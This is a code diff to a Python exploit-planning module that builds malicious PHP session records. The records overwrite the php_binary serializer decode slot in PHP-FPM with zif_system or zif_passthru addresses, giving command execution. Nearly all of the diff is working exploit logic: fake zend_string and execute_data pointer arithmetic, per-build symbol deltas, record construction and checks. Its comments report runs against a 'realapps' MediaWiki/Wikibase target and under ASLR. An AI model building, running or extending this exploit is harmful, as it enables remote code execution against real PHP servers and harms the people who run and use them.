@@ -23,7 +23,23 @@ MediaWiki/Wikibase binary: the active `php` serializer decode slot
 record shape differs from the php_binary G6 builder, so the profile carries
 `record_builder: php_session_zif` and is rejected by the offline builder with a
 pointer to the receipt's `scripts/mkrec.py`; `zif_passthru` 0xa3c074 is symbol
-verified but its clean real-target run is pending.
+verified, and its clean run on that `php` slot is in
+`receipts/realchain_20261022/` (the F12b record itself stays private ASLR-off).
+The separate realapps `php_binary` slot (0x22c54e0) has its own clean
+`zif_passthru` run in the realzif receipt (`receipts/realzif_entry2_1022/`).
+
+The writer always resolves its target by serializer entry name, `php_binary`,
+rather than by a fixed index or by `ps_serializers.default_target`: the lab
+profiles put `php_binary` at the default target, but the realapps profile's
+default target is the F12b `php` slot. The fake execute_data arg1 pointer is
+derived from the record-2 payload start Q:
+``F = X2 + 0x18 + Q + 0x100``. Q shifts with the decimal width of the written
+zif address (0x77 for a seven-digit lab value, 0x78 for realapps 0xa3c074), so
+F must never use a fixed Q. `zif_passthru` is profile data, never
+`zif_system + 0x10`: the delta is +0x10 on the four lab builds and +0x13 on
+realapps. A decode overwrite is worker-local `.data` poison: it persists across
+non-crashing decodes and is cleared only by worker recycle; FPM's crash respawn
+starts a pristine worker.
 
 This module is profile data plus arithmetic: it loads
 addresses/g2_fpm_<build>.json selected by version, binary md5 or path, computes
@@ -80,7 +96,9 @@ ZIF_ARG1_TYPE_OFF = 0x58
 ZIF_ARG1_IS_STRING = 6
 ZIF_RECEIPT = "/tmp/opencode/research/g6zif_20261021T222434Z"
 PHP_BINARY_ZIF_BUILDER = "php_binary_zif"
+PHP_BINARY_SERIALIZER = "php_binary"
 F12B_RECEIPT = "/tmp/opencode/research/f12b_zif_20261021T222457Z"
+REALZIF_RECEIPT = "/tmp/opencode/research/realzif_20261022T013000Z"
 
 
 def _require_record_builder(profile: dict) -> None:
@@ -210,6 +228,36 @@ def _long_value(value: str | bytes) -> bytes:
     return value
 
 
+def _zif_delta(profile: dict) -> int | None:
+    """Return zif_passthru - zif_system from the profile when both exist.
+
+    The delta is build data, not a builder constant: +0x10 on the four lab
+    binaries and +0x13 on realapps (both symbols are 19-byte functions there).
+    A declared zif_route delta is cross-checked against the two addresses.
+    """
+    if profile.get("zif_system") is None or profile.get("zif_passthru") is None:
+        return None
+    system = hex_int(profile["zif_system"], "zif_system")
+    passthru = hex_int(profile["zif_passthru"], "zif_passthru")
+    delta = passthru - system
+    if delta <= 0:
+        raise ValueError(
+            f"zif_passthru 0x{passthru:x} does not follow "
+            f"zif_system 0x{system:x}"
+        )
+    declared = ((profile.get("zif_route") or {}).get("zif_passthru") or {}).get(
+        "delta_from_zif_system")
+    if declared is not None:
+        declared_token = str(declared).strip().split()[0].lstrip("+")
+        declared_value = hex_int(declared_token, "zif_passthru delta")
+        if declared_value != delta:
+            raise ValueError(
+                f"profile zif_route delta {declared!r} disagrees with "
+                f"zif_passthru - zif_system = +0x{delta:x}"
+            )
+    return delta
+
+
 def _zif_symbol(profile: dict, decode: str) -> int:
     """Return the profile's zif_system/zif_passthru address."""
     if decode not in ZIF_DECODE_MODES:
@@ -217,6 +265,8 @@ def _zif_symbol(profile: dict, decode: str) -> int:
             "decode must be one of " + ", ".join(DECODE_MODES)
             + f", not {decode!r}"
         )
+    # Read the profile symbol; never synthesize zif_passthru as
+    # zif_system + 0x10 (realapps uses +0x13).
     if decode not in profile:
         raise ValueError(
             f"profile {profile.get('name')!r} has no {decode} address; "
@@ -225,6 +275,7 @@ def _zif_symbol(profile: dict, decode: str) -> int:
     address = hex_int(profile[decode], f"{decode} address")
     if not 0 < address < 1 << 64:
         raise ValueError(f"{decode} address must be a positive 64 bit address")
+    _zif_delta(profile)
     return address
 
 
@@ -245,26 +296,82 @@ def _zif_command_bytes(command: str | bytes) -> bytes:
     return command
 
 
+def _serializer_entry(profile: dict, name: str) -> dict:
+    """Resolve a ps_serializers entry by name and validate its real slot.
+
+    Table order is profile data, not an ABI constant: the realapps table has
+    `php` at index 1 and `php_binary` at index 2.  Resolve the entry by name,
+    then verify table + index * stride + 0x10 == decode before using it.
+    """
+    table = profile["ps_serializers"]
+    matches = [
+        candidate for candidate in table["entries"]
+        if candidate.get("name") == name
+    ]
+    if len(matches) != 1:
+        raise ValueError(
+            f"profile {profile.get('name')!r} has {len(matches)} "
+            f"ps_serializers entries named {name!r}; expected exactly one"
+        )
+    entry = matches[0]
+    index = entry.get("index")
+    if not isinstance(index, int) or isinstance(index, bool) or index < 0:
+        raise ValueError(
+            f"ps_serializers entry {name!r} has no non-negative integer index"
+        )
+    expected = (
+        hex_int(table["table"], "table")
+        + index * profile["structs"]["ps_serializer_size"]
+        + 0x10
+    )
+    actual = hex_int(entry["decode"], "decode slot")
+    if actual != expected:
+        raise ValueError(
+            f"ps_serializers[{index}] ({name}) decode 0x{actual:x} does not "
+            f"match table + index * stride + 0x10 = 0x{expected:x}"
+        )
+    return entry
+
+
 def _decode_entry(profile: dict, target: int) -> dict | None:
-    """Validate a serializer decode slot and return its profile entry."""
+    """Validate a serializer decode slot and return its profile entry.
+
+    A target outside the table (for example the PS(serializer) pointer route)
+    returns None.  A target that matches an entry is validated by name and by
+    the table arithmetic, and must be 16 byte aligned for the typed write.
+    """
     table = profile["ps_serializers"]
     entry = None
     for candidate in table["entries"]:
         decode = hex_int(candidate["decode"], "decode slot")
         if decode == target:
-            entry = candidate
-            if not candidate.get("decode_16b_aligned"):
+            if entry is not None:
                 raise ValueError(
-                    f"ps_serializers[{candidate['index']}] "
-                    f"({candidate['name']}) decode is not 16 byte aligned"
+                    f"more than one ps_serializers entry uses decode "
+                    f"0x{target:x}"
                 )
-    if entry is not None and target != (
-        hex_int(table["table"], "table")
-        + entry["index"] * profile["structs"]["ps_serializer_size"]
-        + 0x10
-    ):
-        raise ValueError("ps_serializers entry arithmetic disagrees with the table")
+            entry = candidate
+    if entry is None:
+        return None
+    name = entry.get("name")
+    if name is not None:
+        _serializer_entry(profile, name)
+    if not entry.get("decode_16b_aligned"):
+        raise ValueError(
+            f"ps_serializers[{entry['index']}] ({name}) decode is not 16 byte "
+            "aligned"
+        )
     return entry
+
+
+def _fake_zend_string_addr(x2: int, payload_start: int) -> int:
+    """F = ZSTR_VAL(X2) + Q + ZIF_F_PAYLOAD_OFF with Q from record geometry.
+
+    Q is the record-2 payload start.  It moves with the decimal width of the
+    serialized zif address (0x77 for a seven-digit lab value, 0x78 for the
+    eight-digit realapps 0xa3c074), so F must not use a fixed payload offset.
+    """
+    return x2 + 0x18 + payload_start + ZIF_F_PAYLOAD_OFF
 
 
 def _overlaps(start_a: int, end_a: int, start_b: int, end_b: int) -> bool:
@@ -310,8 +417,14 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
             profile_path = resolved_path
     _require_record_builder(profile)
     table = profile["ps_serializers"]
+    serializer = _serializer_entry(profile, PHP_BINARY_SERIALIZER)
+    if not serializer.get("decode_16b_aligned"):
+        raise ValueError(
+            f"ps_serializers[{serializer['index']}] ({PHP_BINARY_SERIALIZER}) "
+            "decode is not 16 byte aligned"
+        )
     if target is None:
-        target = hex_int(table["default_target"], "default target")
+        target = hex_int(serializer["decode"], "php_binary decode slot")
     for name, address in (("x", x), ("p", p), ("b0", b0), ("target", target)):
         if not 0 < address < 1 << 64:
             raise ValueError(f"{name} must be a positive 64 bit address")
@@ -326,19 +439,7 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
         )
     if target % 16:
         raise ValueError(f"target 0x{target:x} is not 16 byte aligned")
-    entry = None
-    for candidate in table["entries"]:
-        decode = hex_int(candidate["decode"], "decode slot")
-        if decode == target:
-            entry = candidate
-            if not candidate.get("decode_16b_aligned"):
-                raise ValueError(
-                    f"ps_serializers[{candidate['index']}] ({candidate['name']}) "
-                    "decode is not 16 byte aligned"
-                )
-    if entry is not None and target != hex_int(table["table"], "table") \
-            + entry["index"] * profile["structs"]["ps_serializer_size"] + 0x10:
-        raise ValueError("ps_serializers entry arithmetic disagrees with the table")
+    entry = _decode_entry(profile, target)
 
     used_slots = used_slots_for(target, b0)
     second_slot = target + 16
@@ -417,6 +518,7 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
         "route": "G2",
         "decode": "php_binary",
         "decode_kind": "php_binary",
+        "serializer": PHP_BINARY_SERIALIZER,
         "status": profile["status"],
         "binary": profile["binary"],
         "build_id": profile["build_id"],
@@ -442,6 +544,11 @@ def plan(x: int, p: int, b0: int, total: int | None = None,
             {"index": entry["index"], "name": entry["name"]}
             if entry is not None else None
         ),
+        "serializer_entry": {
+            "index": serializer["index"],
+            "name": serializer["name"],
+            "decode": serializer["decode"],
+        },
         "ps_serializers": {
             "table": table["table"],
             "active_serializer_slot": table["active_serializer_slot"],
@@ -484,13 +591,14 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
              decode: str = "zif_passthru", target: int | None = None,
              profile: dict | None = None,
              profile_path: Path | None = None) -> dict:
-    """Offline G6 plan: point php_binary decode at zif_system or passthru.
+    """Offline G6 plan: point the php_binary decode slot at zif_system/passthru.
 
-    The write target remains ps_serializers[2].decode; the value written is the
+    The write target is the profile entry named ``php_binary`` (resolved by
+    name, not by a fixed index or ``default_target``); the value written is the
     selected zif handler address.  ``x`` is the first decode zend_string (the
     planted T1 buffer), ``x2`` is the second decode zend_string (the re-encoded
     T2 buffer).  P and B0 are relative to the first buffer, while the fake
-    zend_string pointer F is relative to the second one.
+    zend_string pointer F is derived from the second buffer and Q.
     """
     if decode not in ZIF_DECODE_MODES:
         raise ValueError(
@@ -503,9 +611,16 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
             profile_path = resolved_path
     _require_record_builder(profile)
     table = profile["ps_serializers"]
+    serializer = _serializer_entry(profile, PHP_BINARY_SERIALIZER)
+    if not serializer.get("decode_16b_aligned"):
+        raise ValueError(
+            f"ps_serializers[{serializer['index']}] ({PHP_BINARY_SERIALIZER}) "
+            "decode is not 16 byte aligned"
+        )
     zif = _zif_symbol(profile, decode)
+    zif_delta = _zif_delta(profile)
     if target is None:
-        target = hex_int(table["default_target"], "default target")
+        target = hex_int(serializer["decode"], "php_binary decode slot")
     if x2 is None:
         raise ValueError(
             f"--g2-decode {decode} requires --g2-x2: the second decode "
@@ -547,7 +662,7 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
     length, prefix_len, payload_start = _solve_lengths(total, rec1_len)
     Q = payload_start
     f_off = Q + ZIF_F_PAYLOAD_OFF
-    f_addr = x2 + 0x18 + f_off
+    f_addr = _fake_zend_string_addr(x2, Q)
     if f_addr >= 1 << 64:
         raise ValueError("fake zend_string pointer overflows 64 bits")
     p_off = p - (x + 24)
@@ -562,6 +677,15 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
          "detail": decode},
         {"check": "zif_symbol", "ok": 0 < zif < 1 << 64,
          "detail": f"0x{zif:x}"},
+        {"check": "arg1_pointer_from_Q",
+         "ok": f_addr == x2 + 0x18 + Q + ZIF_F_PAYLOAD_OFF,
+         "detail": f"F=0x{f_addr:x} = X2+0x18 + Q 0x{Q:x} "
+                   f"+ 0x{ZIF_F_PAYLOAD_OFF:x}"},
+        {"check": "zif_passthru_profile_delta",
+         "ok": zif_delta is None or zif_delta > 0,
+         "detail": (f"zif_passthru - zif_system = +0x{zif_delta:x}"
+                    if zif_delta is not None
+                    else "profile carries a single zif symbol")},
         {"check": "key1_length", "ok": ZIF_KEY1_BYTES == 96,
          "detail": f"{ZIF_KEY1_BYTES} byte binary session key"},
         {"check": "value_is_zif_address", "ok": True,
@@ -618,6 +742,8 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
     prefix = b"\x01zs:" + str(length).encode("ascii") + b':"'
     if len(prefix) != prefix_len:
         raise ValueError("record 2 prefix length changed during construction")
+    if len(rec1) + len(prefix) != Q:
+        raise ValueError("record-2 payload start Q changed during construction")
 
     payload = bytearray(length)
     struct.pack_into(
@@ -635,6 +761,9 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
         raise ValueError(f"record is {len(record)} bytes, expected {total}")
     if record[0] != ZIF_KEY1_BYTES:
         raise ValueError("key1 length byte mismatch")
+    if record[ZIF_ARG1_VALUE_OFF:ZIF_ARG1_VALUE_OFF + 8] != \
+            struct.pack("<Q", _fake_zend_string_addr(x2, Q)):
+        raise ValueError("arg1 pointer is not the Q-derived F address")
     if record[payload_start + p_idx:payload_start + p_idx + 8] != \
             struct.pack("<Q", p + 56):
         raise ValueError("fake P placement mismatch")
@@ -674,11 +803,19 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
         "zif_passthru is preferred when the worker must survive; zif_system "
         "is a one-shot proof because the php_exec return-value write is "
         "unavoidable for type=1",
-        "real-target status: F12b pending, F14 attempted-negative, boot2 "
-        "lab-only leak; the G6 proof is a private ASLR-off lab run",
+        "the decode overwrite is worker-local .data poison: it persists "
+        "across non-crashing decodes and is cleared only by worker recycle; "
+        "a crafted crash respawns a pristine worker but is not safe "
+        "remediation",
+        "real-target status: F12b php-slot zif_system confirmed one-shot, and "
+        "its clean zif_passthru run is in the realchain receipt; the realapps "
+        "php_binary slot zif_passthru clean run is in the realzif receipt; F14 "
+        "reproduced under ASLR on with P/B0 from a pre-final calibration; the "
+        "G6 proof is a private ASLR-off lab run",
     ])
     receipts = dict(profile.get("receipts") or {})
     receipts.setdefault("G6", ZIF_RECEIPT)
+    receipts.setdefault("realzif", REALZIF_RECEIPT)
 
     return {
         "profile": profile["name"],
@@ -688,6 +825,7 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
         "route": "G6",
         "decode": decode,
         "decode_kind": "zif",
+        "serializer": PHP_BINARY_SERIALIZER,
         "clean": decode == "zif_passthru",
         "one_shot": decode == "zif_system",
         "target_behavior": target_behavior,
@@ -720,6 +858,8 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
             "zif_passthru": (
                 f"0x{hex_int(profile['zif_passthru'], 'zif_passthru'):x}"
                 if profile.get("zif_passthru") is not None else None),
+            "zif_delta_from_system": (
+                f"0x{zif_delta:x}" if zif_delta is not None else None),
             "php_exec_ex": (
                 f"0x{hex_int(profile['php_exec_ex'], 'php_exec_ex'):x}"
                 if profile.get("php_exec_ex") is not None else None),
@@ -733,6 +873,11 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
             {"index": entry["index"], "name": entry["name"]}
             if entry is not None else None
         ),
+        "serializer_entry": {
+            "index": serializer["index"],
+            "name": serializer["name"],
+            "decode": serializer["decode"],
+        },
         "ps_serializers": {
             "table": table["table"],
             "active_serializer_slot": table["active_serializer_slot"],
@@ -756,6 +901,8 @@ def plan_zif(x: int, x2: int | None, p: int, b0: int,
             "num_args": 1,
             "arg1_value_off": "0x50",
             "arg1_value": f"0x{f_addr:x}",
+            "arg1_value_source": (
+                f"X2 + 0x18 + Q(0x{Q:x}) + 0x{ZIF_F_PAYLOAD_OFF:x}"),
             "arg1_type_off": "0x58",
             "arg1_type": ZIF_ARG1_IS_STRING,
             "arg1_type_name": "IS_STRING",
